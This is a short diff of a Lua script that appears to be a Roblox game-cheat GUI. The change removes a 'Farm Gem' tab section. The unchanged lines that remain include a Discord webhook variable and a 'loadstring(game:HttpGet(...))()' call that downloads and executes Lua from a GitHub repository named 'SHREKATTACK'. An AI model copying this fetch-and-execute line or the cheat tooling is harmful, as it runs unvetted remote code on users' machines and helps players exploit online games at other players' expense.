@@ -623,10 +623,5 @@ local Tab = Window:MakeTab({
 })
 
 
-local Section = Tab:AddSection({
-	Name = "💎Farm Gem💎"
-}) 
-
-
 _G.webhooksdiscord = "https://discord.com/invite/kpT2WKum"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
